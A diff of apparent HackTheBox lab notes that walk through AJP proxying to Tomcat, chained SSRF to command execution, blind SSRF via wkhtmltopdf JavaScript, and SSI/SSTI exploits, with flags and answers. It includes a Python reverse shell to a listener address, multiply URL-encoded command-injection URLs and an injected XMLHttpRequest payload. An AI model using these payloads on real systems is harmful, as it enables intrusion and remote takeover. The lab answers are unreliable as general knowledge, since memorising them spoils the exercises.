@@ -1,114 +1,9 @@
-[What are we doing]
-
--   As you already know:
-
-
-                        +-----------------+               +------------------+
-                        |  Apache HTTP    |               |  Apache Tomcat   |
-                        |    Server       |               |   Application    |
-                        +-----------------+               |      Server      |
-                                ^                         +------------------+
-                                |                                  ^
-                                |                                  | 
-                        HTTP Request/Response              AJP Request/Response
-                                |                                  |
-                                v                                  v
-                        +-----------------+               +------------------+
-                        |    Proxy        |               |  Connector/Port  |
-                        |  (mod_proxy)    | <-----------> |  (AJP Connector) |
-                        +-----------------+               +------------------+
-
-
-1. The Apache HTTP Server acts as a front-end server or reverse proxy, receiving HTTP requests from clients.
-
-2. The Proxy module (mod_proxy) within Apache HTTP Server handles the incoming requests and forwards them to Apache Tomcat (though AJP Connector/Port).
-
-3. The AJP Connector/Port within Apache Tomcat receives the forwarded requests from Apache HTTP Server and passes them to the Application Server (which is Apache Tomcat in this case, processes the requests and generates responses).
-
-4. The AJP Connector/Port within Apache Tomcat sends the response back to Apache HTTP Server using the AJP protocol.
-
-5. Finally, Apache HTTP Server delivers the response to the client that initiated the request.
-
-                            
-                Attacker (A)         Nginx (Reverse Proxy)         Tomcat (B)
-                    +                        +                           +
-                    |                        |                           |
-                    |   Port Forwarding      |                           |
-                    |      or VPN            |                           |
-                    |                        |                           |
-                    |                        |                           |
-                    |   Encrypted Connection |                           |
-                    |      (e.g., SSH, VPN)  |                           |
-                    |                        |                           |
-                    |                        |                           |
-                    |       Test Payload     |                           |
-                    |----------------------->|                           |
-                    |                        |                           |
-                    |       AJP Requests     |                           |
-                    |----------------------------------------------->    |
-                    |                        |       AJP Requests        |
-                    |                        |---------------------->    |
-                    |                        |                           |
-                    |     AJP Request        |  Processing & Generating  |
-                    |     Processing         |   Application Response    |
-                    |<-----------------------|                           |
-                    |                        |                           |
-                    |                        |                           |
-                    |     AJP Response       |                           |
-                    |<-----------------------|                           |
-                
-                 
-1. The Attacker's machine (A) initiates a connection to the Network Device (Router/Firewall).
-
-2. The Network Device is configured to forward incoming traffic on a specific port (Port X) to a designated port (Port Y) on the Remote Server (B).
-
-3. The Attacker's machine sends network traffic to the Network Device on Port X, which is then forwarded to the Remote Server on Port Y.
-
-4. The Remote Server receives the forwarded network traffic and processes it accordingly.
-
-                                       
-                        +-----------------------------------+
-                        |       Attacker's Machine (A)      |
-                        +-----------------------------------+
-                        |                                   |
-                        |  1. Download Nginx source code    |
-                        |     and required module           |
-                        |                                   |
-                        |  2. Compile Nginx source code     |
-                        |     with ajp_module               |
-                        |                                   |
-                        |  3. Create configuration file     |
-                        |     pointing to the AJP Port      |
-                        |                                   |
-                        +-----------------------------------+
-                                        |
-                                        v
-                        +-----------------------------------+
-                        |  Network Device (Router/Firewall) |
-                        +-----------------------------------+
-                        |                                   |
-                        |         Port Forwarding           |
-                        |                                   |
-                        +-----------------------------------+
-                                        |
-                                        v
-                        +-----------------------------------+
-                        |       Remote Server (B)           |
-                        +-----------------------------------+
-                        |                                   |
-                        |          Tomcat Manager           |
-                        |                                   |
-                        +-----------------------------------+
-
-
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Nginx Reverse Proxy & AJP]
 
 [*] Target: 68.183.47.129:32672
 
-[Question 1] Replicate the steps shown in this section to connect to the above server's "hidden" Tomcat page through the AJP proxy, then write the Tomcat version as your answer
+[Question 1] Replicate the steps shown in this section to connect to the above server's "hidden" Tomcat page through the AJP proxy, 
+             then write the Tomcat version as your answer
 
              ( Remember that the port you will see next to "Target:" will be the AJP proxy port. Answer format: X.X.XX )
 
@@ -142,8 +37,6 @@
 
     # curl http://127.0.0.1:8080
 
-    (Note: Nginx is listening on port 8080 on the local machine (127.0.0.1), and it acts as a reverse proxy to forward requests to the Tomcat server at 68.183.47.129:32672)
-
             <!DOCTYPE html>
             <html lang="en">
                 <head>
@@ -158,14 +51,12 @@
     [!] Answer: "8.0.53"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [SSRF Exploitation Example]
 
 [*] Target: 10.129.239.252
 
-[Question 1] Replicate what you learned in this section to gain code execution on the spawned target, then look for the flag in the root directory and submit the contents as your answer.
+[Question 1] Replicate what you learned in this section to gain code execution on the spawned target, 
+             then look for the flag in the root directory and submit the contents as your answer.
 
     [Step 1] Discovering Open Ports
 
@@ -195,7 +86,7 @@
             <h1>Redirecting...</h1>
             <p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.                                                                                                     
 
-            => Redirect status code =)) Oke 
+            => Redirect status code! Oke 
 
         # curl -i http://10.129.239.252:80/load?q=index.html 
 
@@ -482,7 +373,9 @@
 
         - I think we must encode our commands 3 times because they have to go through three web applications.
 
-        => find / -name '*flag*' 2>/dev/null after 3 times URL encoded <=> find%252520%25252F%252520-name%252520%252527%25252Aflag%25252A%252527%2525202%25253E%25252Fdev%25252Fnull
+        => find / -name '*flag*' 2>/dev/null after 3 times URL encoded 
+        
+            <=> find%252520%25252F%252520-name%252520%252527%25252Aflag%25252A%252527%2525202%25253E%25252Fdev%25252Fnull
 
         - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=find%252520%25252F%252520-name%252520%252527%25252Aflag%25252A%252527%2525202%25253E%25252Fdev%25252Fnull 
 
@@ -493,19 +386,19 @@
 
         => cat /root/flag.txt <=> cat%252520%25252Froot%25252Fflag.txt
 
-        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=cat%252520%25252Froot%25252Fflag.txt => HTB{55rf_2_rc3} 
+        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=cat%252520%25252Froot%25252Fflag.txt 
+        
+        => HTB{55rf_2_rc3} 
 
     [!] Answer: "HTB{55rf_2_rc3}"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [Blind SSRF Exploitation Example]
 
 [*] Target: 10.129.239.252 (same target as the previous question)
 
-[Question 1] The target is vulnerable to blind SSRF. Leverage this blind SSRF vulnerability to interact with internal.app.local and achieve remote code execution against the internal service listening on port 5000, as you did in the previous section
+[Question 1] The target is vulnerable to blind SSRF. Leverage this blind SSRF vulnerability to interact with internal.app.local 
+             and achieve remote code execution against the internal service listening on port 5000, as you did in the previous section
              Submit the kernel release number as your answer (Answer format: X.X.X-XX)
 
     # nmap 10.129.239.252 -p- -sV -g 53 -Pn -disable-arp-ping
@@ -578,11 +471,13 @@
 
     => In the User-Agent header you will see "wkhtmltopdf" which means you can run JS in this system
 
-    - Remember where we ran commands in the previous question =)) but this time we only encoded the command 2 times oke =)) I think you understand the reason why
+    - Remember where we ran commands in the previous question =)) 
+      but this time we only encoded the command 2 times oke =)) I think you understand the reason why
 
     - To gather the kernel release and sent it back to my listener, I used a bash reverse shell
 
-      => export RHOST="10.10.16.27";export RPORT="12345";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+      => export RHOST="10.10.16.27";export RPORT="12345";python -c 
+        'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
       <=> export%2520RHOST%253D%252210.10.16.27%2522%253Bexport%252....2Fbin%252Fsh%2522%2529%2527 (Just URL encode the shell I gave you 2 times oke)
 
@@ -591,7 +486,7 @@
         <html>
             <script>
             var http = new XMLHttpRequest();
-            http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.16.27%2522%253Bexport%252....2Fbin%252Fsh%2522%2529%2527 ", true); 
+            http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST\....2Fbin%252Fsh%2522%2529%2527 ", true); 
             http.send();
             http.onerror = function(){document.write('<a>Oops!</a>');}
             </script>
@@ -605,9 +500,6 @@
         Linux f53c1f1e6368 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 GNU/Linux
 
     [!] Answer: "5.4.0-89"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [Server-Side Includes Overview]
@@ -697,9 +589,6 @@
             => HTB{Y0uV3GotSk1lls!}
 
     [!] Answer: "HTB{Y0uV3GotSk1lls!}"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [SSTI Exploitation Example 1]
@@ -803,14 +692,12 @@
     [!] Answer: "HTB{IWasJustAskingForYourName}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [SSTI Exploitation Example 2]    
 
 [*] Target: 143.110.162.223:32712
 
-[Question 1] Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. Answer format: HTB{String}
+[Question 1] Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. 
+             Answer format: HTB{String}
 
 - Go to http://143.110.162.223:32712/, Enter your email, and submit
 
@@ -896,9 +783,6 @@
     [!] Answer: "HTB{6M1ll1onD0ll4rD3v3l0p3r}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [SSTI Exploitation Example 3]
 
 [*] Target: 134.209.180.248:32674
@@ -955,9 +839,6 @@
         posix-linux $ 
 
         [!] Answer: "HTB{l33tSk1llsY0uH4ve}"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [Server-Side Attacks - Skills Assessment]
